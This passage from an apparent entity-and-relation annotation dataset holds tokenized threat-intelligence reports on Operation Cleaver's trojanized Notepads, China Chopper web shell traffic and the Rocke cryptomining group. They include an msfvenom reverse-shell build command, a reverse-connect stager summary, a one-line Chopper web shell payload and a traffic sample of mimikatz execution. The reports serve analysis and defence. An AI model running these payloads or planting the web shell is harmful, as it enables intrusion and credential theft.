";", "char", "*", "p", "=", "(", "char", "*", ")", "pLdrModule->BaseDllName->Buffer", ";", "for", "(", "int", "n", "=", "pLdrModule->BaseDllName->MaximumLength", ";", "n", "!", "=", "0", ";", "p++", ",", "n--", ")", "{", "char", "ch", "="], ["*", "p", ";", "if", "(", "ch", ">", "=", "'", "a", "'", ")", "ch", "-=", "0x20", ";", "hash", "=", "_", "rotr(hash", ",", "13", ")", "+"], ["(", "unsigned", "char", ")", "ch", ";", "}", "return", "hash", ";", "}", "unsigned", "int", "GetExportNameHash(char", "*", "pszName", ")", "{", "unsigned", "int", "hash", "=", "0", ";", "for", "(", ";", ";", "pszName++", ")", "{", "hash", "=", "_", "rotr(hash", ",", "13", ")", "+"], ["(", "unsigned", "char", ")", "*", "pszName", ";", "if", "(", "*", "pszName", "=", "=", "0", ")"], ["break", ";", "}", "return", "hash", ";", "}"], ["Still", ",", "this", "is", "all", "just", "preamble", "."], ["What", "is", "the", "point", "that", "it", "eventually", "gets", "to", "?"], ["You", "'d", "be", "forgiven", "for", "assuming", "that", "the", "tremendous", "amount", "of", "effort", "poured", "into", "obfuscation", "means", "there", "'s", "some", "treasure", "beyond", "all", "fables", "at", "the", "bottom", "of", "this", "erstwhile", "Notepad", "."], ["Sorry", "."], ["It", "just", "downloads", "and", "executes", "a", "block", "of", "raw", "code", "."], ["(", "Spoiler", ":", "it", "'s", "actually", "a", "Metasploit", "reverse", "connect", "stager", ".", ")"], ["Here", "is", "its", "behavior", "summarized", "as", "function", "calls", ":", "kernel32!LoadLibraryA(\"ws2_32", "\"", ")"], ["ws2_32!WSAStartup", "(", "...", ")", "s", "=", "ws2_32!WSASocketA(AF_INET", ",", "SOCK_STREAM", ",", "...", ")"], ["ws2_32!connect(s", ",", "{", "sin_family", "=", "AF_INET", ",", "sin_port", "=", "htons(12345", ")", ",", "sin_addr"], ["=", "108.175.152.2", "30", "}", ",", "0x10", ")"], ["ws2_32!recv(s", ",", "&", "cb", ",", "4", ",", "0", ")", "p", "=", "kernel32!VirtualAlloc(NULL", ",", "cb", ",", "MEM_COMMIT", ",", "PAGE_EXECUTE_READWRITE", ")"], ["ws2_32!recv(s", ",", "p", ",", "cb", ",", "0", ")"], ["p", "(", ")", "The", "above", "is", "known", "to", "be", "true", "for", "Notepad3.exe", ",", "Notepad4.exe", ",", "and", "notepad10.exe", "."], ["NOTEPAD2.EXE", "does", "n't", "seem", "to", "want", "to", "run", ",", "for", "reasons", "we", "did", "n't", "bother", "to", "troubleshoot", "for", "the", "bad", "guys", "."], ["Denouement"], ["Unfortunately", ",", "we", "never", "did", "obtain", "a", "sample", "of", "the", "code", "that", "might", "have", "been", "downloaded", "."], ["The", "key", "to", "that", "enigma", "-", "embedded", ",", "mystery", "-", "wrapped", "riddle", "is", "forever", "lost", "to", "us", "."], ["The", "best", "we", "can", "do", "is", "read", "what", "'s", "written", "in", "the", "Notepads", "and", "speculate", "as", "to", "why", "they", "exist", "at", "all", "."], ["Clearly", "whatever", "generator", "created", "these", "Notepads", "is", "far", ",", "far", "beyond", "the", "technical", "understanding", "of", "the", "Cleaver", "team", "."], ["It", "stands", "to", "reason", "that", "there", "is", "a", "generator", "--", "no", "chance", "these", "were", "crafted", "by", "hand", "--", "and", "that", "its", "sophistication", "is", "even", "greater", "than", "that", "of", "its", "output", "."], ["Something", "like", "that", "would", "n't", "be", "used", "only", "once", "."], ["Something", "like", "that", ",", "if", "this", "team", "was", "able", "to", "get", "ahold", "of", "it", ",", "must", "be", "out", "there", "."], ["Turn", "the", "right", "corner", "of", "the", "internet", ",", "and", "you", "can", "find", "anything", "..."], ["Well", "it", "so", "happens", "that", "we", "did", "eventually", "find", "it", "."], ["Some", "of", "you", "have", "no", "doubt", "suspected", "it", "all", "along", ",", "and", "now", "I", "'ll", "humbly", "confirm", "it", "for", "you", ":", "the", "Notepads", "were", ",", "in", "their", "entirety", ",", "generated", "by", "Metasploit", "."], ["Something", "along", "the", "lines", "of", "\"", "msfvenom", "-x", "notepad.exe", "-p", "windows", "/", "shell", "/", "reverse_tcp", "-e", "x86", "/", "shikata_ga_nai", "-i", "5", "LHOST=108.175.152.230", "LPORT=12345", ">", "Notepad4.exe", "\"", "."], ["The", "\"", "msfvenom", "\"", "tool", "transmogrifies", "a", "Metasploit", "payload", "into", "a", "standalone", "EXE", ",", "and", "with", "the", "\"", "-x", "\"", "switch", ",", "it", "'ll", "fuse", "the", "payload", "--", "encoded", "as", "desired", "--", "into", "a", "copy", "of", "an", "existing", "executable", ",", "exhibiting", "exactly", "the", "behavior", "we", "just", "described", "."], ["Omne", "ignotum", "pro", "magnifico", "."], ["Perhaps", "the", "more", "bizarre", "a", "thing", "is", ",", "the", "less", "mysterious", "it", "proves", "to", "be", "."], ["However", ",", "we", "'re", "still", "left", "to", "wonder", "what", "Cleaver", "was", "up", "to", "when", "they", "generated", "all", "those", "Notepads", "."], ["One", "conclusion", "Brian", "proposed", "is", "that", "they", "'re", "intended", "as", "backdoors", "--", "replacements", "for", "the", "legitimate", "Notepad", "on", "a", "compromised", "system", "--", "which", "would", "enable", "Cleaver", "to", "regain", "access", "to", "a", "system", "at", "some", "indeterminate", "time", "in", "the", "future", ",", "the", "next", "time", "a", "user", "runs", "Notepad", "."], ["The", "team", "demonstrated", "a", "similarly", "intentioned", "tactic", "with", "a", "connect", "-", "back", "shell", "scheduled", "to", "run", "in", "a", "six", "-", "minute", "window", "each", "night", ";", "the", "Notepad", "replacement", ",", "while", "more", "intrusive", ",", "could", "be", "another", "example", "of", "this", "contingency", "planning", "tendency", "."], ["Or", "maybe", "the", "Notepads", "were", "only", "an", "aborted", "experiment", ",", "attempted", "and", "shelved", ",", "forgotten", "in", "a", "flurry", "of", "compromises", "and", "criminal", "activity", "."], ["If", "nothing", "else", ",", "they", "made", "for", "an", "unexpected", "bit", "of", "mystery", "."], ["Tags", ":", "Operation", "Cleaver(//blog.cylance.com", "/", "topic", "/", "operation", "-", "cleaver", ")"], ["\u00ab", "Back", "to", "Blog(//blog.cylance.com", ")", "(", "https://cylance.com/cylance-careers", ")", "\uf167", "\uf0e1", "(", "https://www", "."], ["(", "https://w", "Careers", "@"], ["Cylance", "\uf09a", "\uf099"], ["(", "https://www", "."], ["(", "https://tw", "(", "https://cylance.com/company", ")", "Company"], ["Profile", "Blog", "AI", "vs.", "AV", "Gorillas", "and", "Germans", "and", "Gartner", ",", "oh", "my"], ["By", ":", "Stuart", "McClure", "(", "//blog.cylance.com", "/", "ai", "-", "vs.-av", "-", "gorillas", "-", "and", "-", "germans", "-", "and", "-", "gartner", "-", "oh", "-", "my", ")"], ["(", "https://cylance.com/products-protect", ")"], ["The"], ["Unbelievable"], ["Tour", "(", "https://cylance.com/events-on-tour", ")", "(", "https://cylance.com", ")"], ["Home(https://cylance.com/", ")"], ["Partners", "Events"], ["Technology"], ["Unbelievable"], ["Partners(https://cylance.com", "/", "technologyTour(https://cylance.com", "/", "even", "Products", "partner", ")", "on", "-", "tour", ")"], ["PROTECT(https://cylance.com", "/", "productsprotect", ")"], ["Resellers(https://cylance.com", "/", "partners-", "Events", "&", "reseller"], [")", "Tradeshows(https://cylance.co", "PROTECT", "+", "Threat"], ["(", "https://www.youtube.com/user/CylanceInc", ")"], ["Partner", "Portal", "corporate", "-", "events", ")"], ["Zero(https://cylance.com", "/", "productsWebinars(https://cylance.com/", "protect", "-", "threat", "-", "zero)Login(https://cylance.portal.relayware.com/", ")"], ["Become", "a", "webinar", ")"], ["PROTECT", "for", "Critical"], ["(", "https://www.linkedin.com/company/cylanceinc", ")"], ["Partner(https://cylance.portal.relayware.com/", "?"], ["Infrastructure(https://cylance.com", "/", "productseid", "=", "register", ")"], ["protect", "-", "critical", "-", "infrastructure", ")"], ["Resources", "(", "https://www.facebook.com/CylanceInc", ")", "PROTECT", "for", "Whitepap", "Education(https://cylance.com", "/", "productsDatasheets(https://cylance.com"], ["Company", "protect", "-", "education", ")"], ["Who", "We", "Videos(//www.cylance.com", "/", "res", "(", "https://twitter.com/cylanceinc", ")"], ["PROTECT", "for", "Are(https://cylance.com", "/", "company", ")", "videos", ")"], ["18201"], ["Von", "Karman", ",", "Suite", "700"], ["Energy(https://cylance.com", "/", "productsNews", "+", "Irvine", ",", "CA", "92612", "protect", "-", "energy", ")"], ["Press(https://cylance.com", "/", "companyBlog(//blog.cylance.com", ")"], ["USA(https://www.google.com", "/", "maps", "/", "place/18201+Von+Karman+Ave+%23700,+Irvine,+CA+92612/@33.6779", "PROTECT", "for", "news", "-", "press", "-", "releases", ")"], ["Finance(https://cylance.com", "/", "productsAwards(https://cylance.com", "/", "company-"], ["Contact"], ["Call", "Us", ":", "1", "-", "844", "-", "CYLANCE(tel:+18442952623)protect", "-", "finance", ")", "awards", ")"], ["Us(https://cylance.com", "/", "conta", "1", "-", "844", "-", "295", "-", "2623(tel:+18442952623", ")"], ["PROTECT", "for", "Careers(https://cylance.com", "/", "cylanceus", ")"], ["Healthcare(https://cylance.com", "/", "products-", "careers", ")"], ["Get", "Support", ":", "1", "-", "866", "-", "699", "-", "9689"], ["(", "tel:+18666999686", ")"], ["Privacy", "protect", "-", "healthcare", ")"], ["Contact"], ["Policy(https://cylance.com", "/", "pr", "PROTECT", "for", "Us(https://cylance.com", "/", "contactpolicy", ")"], ["\u00a9", "Cylance", "Inc."], ["All", "Rights", "Reserved"], ["Retail(https://cylance.com", "/", "productsus", ")"], ["Privacy", "protect", "-", "retail", ")"], ["Security", "Policy(https://cylance.com", "/", "privacyTerms", "Of", "Questions(//www.cylance.com", "/", "securitypolicy", ")"], ["Terms", "Of", "Service(https://cylance.com", "/", "t", "questions", ")"], ["Service(https://cylance.com", "/", "terms)Services", "Services", "Support(https://support.cylance.com", "/", "hc", "/", "enSitemap(https://cylance.com", "/", "site-"], ["Overview(https://cylance.com", "/", "services", ")", "\uf167", "\uf0e1", "\uf09a", "\uf099", "Services"], ["Support(https://support.cylance.com", "/", "hc", "/", "enSitemap(https://cylance.com", "/", "site-"], ["Overview(https://cylance.com", "/", "services", ")"], ["us", ")", "Sitemap(https://cylance.com/", "map", ")"], ["Services", "for", "Critical", "map", ")"], ["Infrastructure(https://cylance.com", "/", "servicescritical", "-", "infrastructure", ")"], ["Services", "for", "Education(https://cylance.com", "/", "serviceseducation", ")"], ["Services", "for", "Energy(https://cylance.com", "/", "servicesenergy", ")"], ["Services", "for"], ["Finance(https://cylance.com", "/", "servicesfinance", "-", "and", "-", "banking", ")"], ["Services", "for", "Healthcare(https://cylance.com", "/", "serviceshealthcare", ")"], ["Services", "for", "Retail(https://cylance.com", "/", "servicesretail", ")"]]}, {"vertexSet": [[{"name": "China Chopper", "pos": [4, 6], "sent_id": 0, "type": "Malware"}], [{"name": "30 MAR 2015", "pos": [7, 10], "sent_id": 1, "type": "Time"}], [{"name": "WILLIAM TAN", "pos": [10, 12], "sent_id": 1, "type": "Person"}], [{"name": "Chopper Web shell", "pos": [14, 17], "sent_id": 1, "type": "Malware"}], [{"name": "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\u201dpassword\"],\"unsafe\");%>", "pos": [0, 8], "sent_id": 3, "type": "Payload"}], [{"name": "CrowdStrike", "pos": [0, 1], "sent_id": 6, "type": "Organization"}], [{"name": "System.WebServices.dll", "pos": [18, 19], "sent_id": 6, "type": "Dropper"}], [{"name": "<% WebServices.InitalizeWebServices (\"shell_password\");%>", "pos": [16, 25], "sent_id": 8, "type": "Payload"}], [{"name": "Chopper Web shell", "pos": [4, 7], "sent_id": 11, "type": "Malware"}], [{"name": "Chopper", "pos": [1, 2], "sent_id": 13, "type": "Malware"}], [{"name": "Chopper", "pos": [4, 5], "sent_id": 14, "type": "Malware"}], [{"name": "Chopper", "pos": [19, 20], "sent_id": 14, "type": "Malware"}], [{"name": "ChopShop", "pos": [22, 23], "sent_id": 16, "type": "Software"}], [{"name": "MITRE", "pos": [30, 31], "sent_id": 16, "type": "Organization"}], [{"name": "ChopShop", "pos": [1, 2], "sent_id": 17, "type": "Software"}], [{"name": "Chopper", "pos": [1, 2], "sent_id": 20, "type": "Malware"}], [{"name": "Chopper", "pos": [19, 20], "sent_id": 33, "type": "Malware"}], [{"name": "base64", "pos": [7, 8], "sent_id": 36, "type": "Obfuscation"}], [{"name": "hex", "pos": [9, 10], "sent_id": 36, "type": "Obfuscation"}], [{"name": "Chopper", "pos": [9, 10], "sent_id": 38, "type": "Malware"}], [{"name": "Chopper", "pos": [3, 4], "sent_id": 55, "type": "Malware"}], [{"name": "Chopper", "pos": [1, 2], "sent_id": 56, "type": "Malware"}]], "labels": [{"r": "P13", "h": 3, "t": 4, "evidence": [1, 3]}, {"r": "P13", "h": 6, "t": 7, "evidence": [6, 8]}, {"r": "P17", "h": 13, "t": 12, "evidence": [16]}, {"r": "P13", "h": 16, "t": 17, "evidence": [33, 36]}, {"r": "P13", "h": 16, "t": 18, "evidence": [33, 36]}], "title": "201503CrowdStrikeChinaChopper", "sents": [["Chopping", "packets", ":", "Decoding", "China", "Chopper", "Web", "shell", "traf\ufb01c", "over", "SSL"], ["THE", "FRONT", "LINES", "/", "THE", "TOOL", "BOX", "30", "MAR", "2015", "WILLIAM", "TAN", "INTRODUCTION", "The", "Chopper", "Web", "shell", "is", "a", "widely", "used", "backdoor", "by", "Chinese", "and", "other", "malicious", "actors", "to", "remotely", "access", "a", "compromised", "Web", "server", "."], ["Deployment", "of", "the", "Chopper", "shell", "on", "the", "server", "is", "fairly", "basic", "as", "the", "server", "payload", "is", "a", "single", "line", "inserted", "into", "any", "ASPX", "page", "."], ["<", "%", "@", "Page", "Language=\"Jscript\"%><%eval(Request", ".", "Item[\u201dpassword\"],\"unsafe\");%", ">"], ["This", "payload", "is", "available", "in", "a", "variety", "of", "languages", "including", "ASP", ",", "ASPX", ",", "PHP", ",", "JSP", ",", "and", "CFM", "."], ["Once", "installed", ",", "the", "attacker", "can", "access", "the", "shell", "with", "the", "Chopper", "client", "side", "binary", "."], ["CrowdStrike", "has", "observed", "another", "deployment", "method", "on", "IIS", "servers", "where", "attackers", "upload", "a", "trojanized", "DLL", "\ufb01le", ",", "\u2018", "System.WebServices.dll", "\u2019", "."], ["This", "DLL", "\ufb01le", "is", "written", "in", "C", "#", "and", "contains", "multiple", "Chopper", "API", "functions", "."], ["The", "attacker", "can", "then", "call", "these", "functions", "by", "inserting", "this", "line", "in", "any", "ASPX", "page", ":", "<", "%", "WebServices", ".", "InitalizeWebServices", "(", "\"", "shell_password\");%", ">", "The", "attacker", "can", "access", "this", "Web", "shell", "variant", "with", "similar", "methods", ",", "including", "using", "the", "Chopper", "client", "side", "binary", "."], ["The", "bene\ufb01t", "of", "this", "deployment", "method", "allows", "the", "Web", "shell", "to", "evade", "hostbased", "detection", "methods", "that", "look", "for", "suspicious", "functions", "such", "as", "\u2018", "eval", "\u2019", "."], ["Although", "deployments", "of", "Chopper", "can", "vary", "on", "the", "host", ",", "the", "network", "traf\ufb01c", "patterns", "generated", "by", "the", "Web", "shell", "have", "remained", "largely", "unchanged", "."], ["CHOPPER", "NETWORK", "TRAFFIC", "The", "Chopper", "Web", "shell", "client", "communicates", "over", "TCP", "using", "HTTP", "POST", "requests", "."], ["Network", "traf\ufb01c", "analysis", "of", "chopper", "packets", "can", "reveal", "attacker", "actions", ",", "intentions", ",", "and", "next", "steps", "."], ["Because", "Chopper", "generates", "a", "POST", "request", "for", "each", "command", ",", "manual", "analysis", "can", "get", "tedious", "if", "the", "attacker", "is", "very", "active", "."], ["Another", "challenge", "occurs", "when", "Chopper", "is", "deployed", "on", "a", "Web", "server", "behind", "SSL", ",", "causing", "all", "traf\ufb01c", "generated", "by", "Chopper", "to", "be", "encrypted", "."], ["Figure", "1", "."], ["Example", "of", "Chopper", "\u2019s", "encoded", "command", "with", "response", "over", "decrypted", "HTTPs", "DECODING", "WITH", "CHOPSHOP", "To", "assist", "with", "rapid", "triage", ",", "we", "leverage", "ChopShop", ",", "a", "network", "decoder", "framework", "developed", "by", "MITRE", "(", "https://github.com/MITRECND/chopshop", ")", "."], ["The", "ChopShop", "framework", "is", "extendable", "with", "modules", ",", "and", "the", "output", "from", "each", "module", "can", "be", "chained", "."], ["Doing", "so", "reduces", "the", "need", "to", "rewrite", "a", "decoder", "for", "widely", "used", "protocols", "."], ["This", "allows", "the", "analyst", "to", "focus", "on", "developing", "modules", "speci\ufb01c", "to", "a", "family", "of", "malware", "without", "dealing", "with", "the", "underlying", "protocols", "."], ["The", "Chopper", "decode", "module", "I", "have", "written", "for", "the", "ChopShop", "Framework", "is", "designed", "to", "be", "chained", "with", "the", "\u2018", "chop_ssl", "\u2019", "and", "\u2018", "http", "\u2019", "modules", "."], ["To", "decode", "SSL", "traf\ufb01c", ",", "the", "\u2018", "chop_ssl", "\u2019", "module", "requires", "the", "server", "\u2019s", "private", "key", "in", "RSA", "format", "."], ["I", "\u2019ve", "provided", "an", "initial", "version", "of", "this", "module", "on", "our", "Github", "page", "(", "https://github.com/CrowdStrike/chopshop", ")", "."], ["webshell_chopper_decode"], ["(", "0.1", ")", "--", "requires", "ChopLib", "4.0", "or", "greater", ":", "Extract", "Chopper", "Webshell", "commands", "and", "output", "from", "HTTP", "traffic", "."], ["Requires", "'", "http", "'", "parent", "module", "."], ["Usage", ":", "webshell_chopper_decode"], ["[", "options", "]"], ["Options", ":", "-h", ",", "--help", "show", "this", "help", "message", "and", "exit", "-d", ",", "--dict_output", "Formats", "output", "to", "sets", "of", "dicts", "-c", ",", "--commands_only", "Only", "output", "chopper", "commands"], ["-o", ",", "--outputs_only", "-x", ",", "--extract_pe"], ["Only", "output", "chopper", "responses"], ["Attempts", "to", "extract", "pe", "files", "from", "session", "Sample", "usage", "commands", ":", "./chopshop"], ["\u2013", "f", "chopper_traffic_ssl.pcap", "\"", "chop_ssl", "-k", "privatekeyrsa.key", "|", "http", "|", "webshell_chopper_decode", "\"", ">", "decoded_commands.txt", "./chopshop"], ["\u2013", "f", "chopper_traffic_http.pcap", "\"", "http", "|", "webshell_chopper_decode", "-c", "\"", "The", "module", "output", "contains", "all", "commands", "and", "responses", "from", "the", "Chopper", "shell", "."], ["The", "module", "will", "decode", "the", "entire", "PCAP", "and", "separate", "the", "each", "command", "parameter", "\u2018", "z0", "\u2019", ",", "\u2018", "z1", "\u2019", ",", "\u2018", "z2", "\u2019", "on", "a", "separate", "line", "."], ["These", "\u2018", "z", "\u2019", "parameters", "in", "the", "form", "data", "contain", "the", "arguments", "to", "commands", ",", "which", "are", "passed", "from", "the", "Chopper", "client", "to", "the", "server", "payload", "."], ["While", "the", "commands", "are", "encoded", "in", "either", "base64", "or", "hex", ",", "the", "responses", "are", "not", "encoded", "."], ["In", "the", "sample", "output", "below", ",", "we", "see", "an", "attacker", "running", "a", "\u2018", "dir", "\u2019", "command", "\ufb01le", "looking", "for", "\u2018", "w3wp.exe", "\u2019", "(", "a", "renamed", "version", "of", "cmd.exe", ")", "and", "subsequently", "executing", "the", "credential", "dumper", "\u2018", "mimikatz", "\u2019", "(", "named", "pwd.txt", ")", "."], ["Portable", "executable", "(", "PE", ")", "\ufb01les", "used", "by", "the", "Chopper", "Web", "shell", "are", "parsed", "as", "hex", "encoded", "by", "the", "module", "."], ["The", "Chopper", "decode", "module", "has", "an", "option", "to", "attempt", "to", "carve", "out", "and", "save", "any", "PE", "\ufb01les", "in", "the", "commands", "or", "responses", "seen", "during", "an", "attacker", "\u2019s", "C2", "session", "."], ["./chopshop"], ["-s", "."], ["\u2013", "f", "chopper_traffic_ssl.pcap", "\"", "chop_ssl", "-k", "privatekeyrsa.key", "|", "http", "|", "webshell_chopper_decode"], ["\u2013", "x", "\"", "Note", "the", "addition", "of", "the", "\u201c", "-s", "\u201d", "\ufb02ag", ",", "which", "needs", "to", "be", "set", "to", "tell", "ChopShop", "which", "directory", "to", "output", "saved", "\ufb01les", "."], ["Figure", "2", "."], ["Sample", "portion", "of", "output", "from", "decode", "module", "showing", "\u2018", "mimikatz", "\u2019", "execution", "."], ["\u2026"], ["chopper_extracted_file-1.bin", "saved", ".."], ["[", "COMMAND", "]", "at", "2015", "-", "02", "-", "24", "07:03:05", "UTC"], ["[", "Z0", "Parameter", "]", "-", "Q1|"], ["[", "Z1", "Parameter", "]", "\\\\192.168.1.11\\c$\\inetpub\\wwwroot\\Citrix\\XenApp\\bin\\System", "."], ["WebServices.dll"], ["[", "Z2", "Parameter", "]", "4D5A90000300000004000000FFFF0000B80000000000000040000000000000000000", "0000000000000000000000000000000000000000000000000000800000000E1FBA0E"], ["00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F74206265207", "2756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103", "00D2963C500000000000000000E00002210B0108000036000000080000000000002"], ["E5500000020000000600000000040000020000000020000040000000000000004000", "0000000000000A000000002000000000000030040850000100000100000000010000", "010000000000000100000000000000000000000DC5400004F0000000060000008050", "00000000000000000000000000000000000008000000C000000445400001C0000000", "00000000000000000000000000000000000000000000000000000000000000000000", "0000000000000200000080000000", "\u2026", "FINAL", "THOUGHTS", "Figure", "3", "."], ["Carved", "PE", "from", "Chopper", "traf\ufb01c", "opened", "in", "hex", "editor", "."], ["With", "Chopper", "available", "in", "so", "many", "varieties", "of", "programming", "and", "scripting", "languages", ",", "this", "module", "is", "still", "in", "development", "to", "account", "for", "different", "variants", "and", "edge", "cases", "."], ["The", "goal", "of", "this", "module", "was", "to", "ease", "some", "of", "the", "tediousness", "of", "extracting", "information", "out", "of", "a", "large", "packet", "capture", "."], ["With"], ["the", "prevalence", "of", "Chopper", "\u2019s", "use", "by", "APT", "groups", ",", "being", "able", "to", "quickly", "decode", "and", "understand", "what", "an", "attacker", "is", "doing", "greatly", "increases", "the", "situational", "awareness", "of", "incident", "responders", "."], ["REFERENCES", "https://github.com/CrowdStrike/chopshop", "https://github.com/MITRECND/chopshop", "https://github.com/MITRECND/htpy", "http://www.mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/decrypting-ssl-withchopshop", "https://www.\ufb01reeye.com/content/dam/legacy/resources/pdfs/\ufb01reeye-china-chopper-report.pdf", "http://informationonsecurity.blogspot.com/2012/11/china-chopper-webshell.html", "1", "8", "\u2190", "New", "White", "House", "Executive", "Order", ":"], ["Sanctions", "in", "Response", "to", "Cyber", "Intrusions", "The", "Future", "of", "Privacy", ",", "Data", ",", "and"], ["Cyber"], ["Crime", "and", "its", "Impact", "on", "the", "American", "Business", "Dream", "\u2192", "Follow", "Us", "Tweets", "CrowdStrike"], ["@CrowdStrike", "12h", "Check", "out", "@media\ufb01shy", "discuss", "the", "future", "of", "AV", "and", "why", "endpoint", "protection", "is", "paramount", "ow.ly/UZ12X", "#", "cybersecurity", "#", "infosec"], ["Show", "Media"], ["CrowdStrike", "@CrowdStrike", "20", "Nov", "Check", "out", "@Shawn365Henry", "'s", "security", "tips", "in", "\"", "The", "Top", "5", "#", "Cybersecurity", "Mistakes", "Companies", "Make", "&", "How", "to", "Avoid", "Them", "\"", "ow.ly/USNQD", "Expand", "Eric", "Opdyke", "@EricOpdyke", "20", "Nov", "Got", "my", "sweet", "new", "@CrowdStrike", "Dead", "Eye", "Jackal", "shirt", "today", "#"], ["DFIR", "#", "malware", "#", "deadeyejackal", "pic.twitter.com/mihenWdbAa"], ["Retweeted", "by", "CrowdStrike", "Compose", "new", "Tweet", "\u2026", "Recent", "Posts"], ["The", "Imperative", "for", "Proactive", "Incident", "Response", "in", "2015", "and", "Beyond"], ["November", "3", ",", "2015", "Why", "Your", "Business", "Environment", "Should", "Drive", "Cybersecurity", "November", "2", ",", "2015", "Blurring", "of", "Commodity", "and", "Targeted", "Attack", "Malware", "October", "16", ",", "2015"], ["Should", "I", "Really", "Trust", "the", "Cloud", "with", "my", "Endpoint", "Protection", "?"], ["September", "30", ",", "2015", "U.S.", "\u2013", "China", "Agreement", "on", "Cyber", "Intrusions", ":", "An", "In\ufb02ection", "Point", "September", "25", ",", "2015", "Archives", "N", "M", "T", "W", "O", "V", "T", "E", "M", "B", "E", "F", "R", "2", "S", "0", "1", "5"], ["S", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "\u00ab", "Oct", "Recent", "Comments"]]}, {"vertexSet": [[{"name": "Palo Alto Networks", "pos": [10, 13], "sent_id": 2, "type": "Organization"}], [{"name": "Linux", "pos": [23, 24], "sent_id": 2, "type": "System"}], [{"name": "coin mining", "pos": [24, 26], "sent_id": 2, "type": "Action"}], [{"name": "Iron cybercrime", "pos": [9, 11], "sent_id": 3, "type": "AttackerGroup"}], [{"name": "Xbash", "pos": [19, 20], "sent_id": 3, "type": "Malware"}], [{"name": "Rocke", "pos": [3, 4], "sent_id": 4, "type": "AttackerGroup"}], [{"name": "Talos", "pos": [8, 9], "sent_id": 4, "type": "Organization"}], [{"name": "Rocke group", "pos": [12, 14], "sent_id": 6, "type": "Attacker"}], [{"name": "uninstall", "pos": [18, 19], "sent_id": 6, "type": "ModificationAction"}], [{"name": "cloud security protection", "pos": [21, 24], "sent_id": 6, "type": "ExploitTargetObject"}], [{"name": "full administrative contro", "pos": [19, 22], "sent_id": 7, "type": "ExploitTargetObject"}], [{"name": "Tencent Cloud", "pos": [5, 7], "sent_id": 8, "type": "Organization"}], [{"name": "Alibaba Cloud", "pos": [8, 10], "sent_id": 8, "type": "Organization"}], [{"name": "China", "pos": [20, 21], "sent_id": 8, "type": "Location"}], [{"name": "Coin Miner", "pos": [1, 3], "sent_id": 12, "type": "Exploit"}], [{"name": "Rocke Group", "pos": [5, 7], "sent_id": 12, "type": "AttackerGroup"}], [{"name": "Rocke", "pos": [3, 4], "sent_id": 13, "type": "Attacker"}], [{"name": "Cisco Talos", "pos": [8, 10], "sent_id": 13, "type": "Organization"}], [{"name": "Monero cryptocurrency", "pos": [9, 11], "sent_id": 14, "type": "ExploitTargetObject"}], [{"name": "Rocke group", "pos": [10, 12], "sent_id": 15, "type": "AttackerGroup"}], [{"name": "Apache Struts 2", "pos": [15, 18], "sent_id": 15, "type": "Software"}], [{"name": "WebLogic", "pos": [20, 21], "sent_id": 15, "type": "Software"}], [{"name": "Adobe ColdFusion", "pos": [23, 25], "sent_id": 15, "type": "Software"}], [{"name": "Oracle WebLogic", "pos": [5, 7], "sent_id": 16, "type": "Software"}], [{"name": "CVE-2017-10271", "pos": [8, 11], "sent_id": 16, "type": "Vulnerability"}], [{"name": "Linux", "pos": [12, 13], "sent_id": 16, "type": "Host"}], [{"name": "0720.bin", "pos": [25, 26], "sent_id": 16, "type": "File"}], [{"name": "Rocke group", "pos": [19, 21], "sent_id": 37, "type": "AttackerGroup"}], [{"name": "uninstalls cloud security products", "pos": [7, 11], "sent_id": 38, "type": "Action"}], [{"name": "Alibaba Cloud", "pos": [12, 14], "sent_id": 38, "type": "Organization"}], [{"name": "Tencent Cloud", "pos": [15, 17], "sent_id": 38, "type": "Organization"}], [{"name": "Rocke", "pos": [9, 10], "sent_id": 39, "type": "Attacker"}], [{"name": "Tencent Cloud Monitor", "pos": [16, 19], "sent_id": 39, "type": "ExploitTargetObject"}], [{"name": "Tencent Cloud Monitor process", "pos": [2, 6], "sent_id": 41, "type": "ExploitTargetObject"}], [{"name": "Tencent Cloud", "pos": [1, 3], "sent_id": 43, "type": "Organization"}], [{"name": "Alibaba Cloud", "pos": [4, 6], "sent_id": 43, "type": "Organization"}], [{"name": "Alibaba Threat Detection Service", "pos": [4, 8], "sent_id": 44, "type": "ExploitTargetObject"}], [{"name": "Tencent Cloud Host Security", "pos": [4, 8], "sent_id": 48, "type": "Software"}], [{"name": "Rocke group", "pos": [5, 7], "sent_id": 49, "type": "Attacker"}], [{"name": "Alibaba Cloud", "pos": [13, 15], "sent_id": 49, "type": "Organization"}], [{"name": "Tencent", "pos": [16, 17], "sent_id": 49, "type": "Organization"}], [{"name": "Alibaba Threat Detection Service", "pos": [0, 4], "sent_id": 54, "type": "Software"}], [{"name": "Alibaba CloudMonitor agent", "pos": [0, 3], "sent_id": 56, "type": "Software"}], [{"name": "Alibaba Cloud Assistant agent", "pos": [0, 4], "sent_id": 58, "type": "Software"}], [{"name": "Tencent Host Security agent", "pos": [0, 4], "sent_id": 60, "type": "Software"}], [{"name": "Tencent Cloud Monitor agent", "pos": [0, 4], "sent_id": 62, "type": "Software"}], [{"name": "Rocke group", "pos": [17, 19], "sent_id": 63, "type": "Attacker"}], [{"name": "public cloud infrastructure", "pos": [15, 18], "sent_id": 64, "type": "ExploitTargetObject"}], [{"name": "Palo Alto Networks", "pos": [1, 4], "sent_id": 65, "type": "Organization"}], [{"name": "Tencent Cloud", "pos": [10, 12], "sent_id": 65, "type": "Organization"}], [{"name": "Alibaba Cloud", "pos": [13, 15], "sent_id": 65, "type": "Organization"}], [{"name": "Public cloud infrastructure", "pos": [1, 4], "sent_id": 67, "type": "ExploitTargetObject"}], [{"name": "Rocke group", "pos": [8, 10], "sent_id": 69, "type": "Attacker"}], [{"name": "public cloud infrastructure", "pos": [33, 36], "sent_id": 69, "type": "ExploitTargetObject"}]], "labels": [{"r": "P3", "h": 4, "t": 3, "evidence": [3]}, {"r": "P3", "h": 4, "t": 5, "evidence": [3, 4]}, {"r": "P27", "h": 7, "t": 9, "evidence": [6]}, {"r": "P27", "h": 7, "t": 10, "evidence": [6, 7]}, {"r": "P27", "h": 16, "t": 18, "evidence": [13, 14]}, {"r": "P19", "h": 23, "t": 24, "evidence": [16]}, {"r": "P25", "h": 25, "t": 23, "evidence": [16]}, {"r": "P27", "h": 31, "t": 32, "evidence": [39]}, {"r": "P27", "h": 31, "t": 33, "evidence": [39, 41]}, 